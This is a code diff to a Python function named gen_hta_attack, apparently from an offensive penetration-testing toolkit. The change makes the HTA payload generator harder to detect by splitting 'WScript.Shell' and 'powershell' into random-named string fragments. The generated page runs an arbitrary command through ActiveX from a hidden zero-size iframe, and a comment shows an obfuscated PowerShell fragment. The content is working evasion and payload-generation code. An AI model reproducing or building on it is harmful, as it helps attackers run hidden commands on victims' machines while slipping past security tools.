@@ -531,15 +531,21 @@ def gen_hta_attack(command):
     hta_rand = generate_random_string(10, 30)
 
     # split up so we arent calling shell command for cmd.exe
-    shell_split1 = generate_random_string(10, 30)
-    shell_split2 = generate_random_string(10, 30)
-    shell_split3 = generate_random_string(10, 30)
-    shell_split4 = generate_random_string(10, 30)
-    shell_split5 = generate_random_string(10, 30)
+    shell_split1 = generate_random_string(10, 100)
+    shell_split2 = generate_random_string(10, 100)
+    shell_split3 = generate_random_string(10, 100)
+    shell_split4 = generate_random_string(10, 100)
+    shell_split5 = generate_random_string(10, 100)
 
-    main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, shell_split5))
-    main2 = ("""{0}.run('""".format(hta_rand))
-    main4 = ("""{0}', 0);window.close();\n</script>""".format(command))
+    # 'powershell /w 1 /C "s\'\'v EZE -;s\'\'v KRA e\'\'c;s\'\'v gvH ((g\'\'v EZE).value.toString()+(g\'\'v KRA).value.toString());powershell (g
+    ps_split1 = generate_random_string(10, 100)
+    ps_split2 = generate_random_string(10, 100)
+    ps_split3 = generate_random_string(10, 100)
+    ps_split4 = generate_random_string(10, 100)
+
+    main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{6} = "pow";\n{7} = "ersh";\n{8} = "ell";\n{9} = ({6} + {7} + {8});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, ps_split1, ps_split2, ps_split3, ps_split4))
+    main2 = ("""{0}.run(""".format(hta_rand))
+    main4 = ("""{0}', 0);window.close();\n</script>""".format(command)).replace("powershell", "{0} + '".format(ps_split4)).replace(";{0}".format(ps_split4), ";' + {0}".format(ps_split4))
     html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")
 
     # remote old directory
